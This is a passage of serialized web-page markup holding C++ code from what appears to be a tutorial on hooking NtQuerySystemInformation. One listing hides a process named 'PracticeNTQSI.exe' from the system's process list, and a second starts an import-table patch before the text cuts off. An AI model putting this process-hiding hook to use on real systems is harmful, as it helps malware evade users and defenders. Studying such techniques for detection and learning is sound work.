react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                    bufferSize\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token function\",\"style\":{},\"children\":[\"NT_SUCCESS\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"status\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"while\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      PSYSTEM_PROCESS_INFORMATION nextProcessInformation \"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token function\",\"style\":{},\"children\":[\"PSYSTEM_PROCESS_INFORMATION\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                      \"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPBYTE\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token function\",\"style\":{},\"children\":[\"wcscmp\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"nextProcessInformation\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ImageName\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token type-opencl-host-cpp\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"Buffer\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                 L\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"PracticeNTQSI.exe\\\"\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        offsetToHideProcess \"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            offsetToHideProcess \"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" systemInformation\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        systemInformation\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset \"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            nextProcessInformation\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset \"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            systemInformation\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      systemInformation \"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PSYSTEM_PROCESS_INFORMATION\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset \"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                        \"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPBYTE\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}]]]}]}],[\"$\",\"div\",null,{\"className\":\"text-center text-md text-gray-500 mt-2 mb-2\",\"children\":\"Listing 2. Removing chosen process name from NTSQI result\"}]],[\"$\",\"p\",null,{\"children\":\"$9\"}],[\"$\",\"br\",null,{}],[[\"$\",\"pre\",null,{\"style\":{\"color\":\"white\",\"background\":\"hsl(0, 0%, 8%)\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"borderRadius\":\".5em\",\"border\":\".3em solid hsl(0, 0%, 33%)\",\"boxShadow\":\"1px 1px .5em black inset\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"padding\":\"1em\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-cpp\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"white\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"void\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token function\",\"style\":{},\"children\":[\"Patch\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"char\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"dllName \"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"dll.dll\\\"\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"char\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"funcName \"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"NtQuerySystemInformation\\\"\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[\"// https://stackoverflow.com/questions/7673754/pe-format-iat-questions\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  HMODULE hModule \"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token 